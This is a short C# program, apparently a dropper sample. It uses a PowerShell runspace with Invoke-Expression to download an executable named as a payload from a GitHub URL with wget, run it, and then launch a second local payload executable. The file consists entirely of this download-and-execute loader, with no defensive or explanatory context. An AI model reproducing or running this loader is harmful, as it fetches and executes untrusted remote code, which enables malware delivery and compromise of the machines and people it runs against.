using System;
using System.Management.Automation;
namespace Powershell
{
    class Program
    {
        static void Main(string[] args)
        {
            PowerShell ps = PowerShell.Create();
            ps.AddCommand("Invoke-Expression");
            ps.AddArgument("$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Csharp2Powershell/Csharp2PowershellOnlinePayload.exe';$output = 'Csharp2PowershellOnlinePayloadDownloaded.exe';wget $url -outfile $output;./Csharp2PowershellOnlinePayloadDownloaded.exe;Start-Process -FilePath 'Csharp2PowershellOfflinePayload.exe';");
            ps.Invoke();
        }
    }
}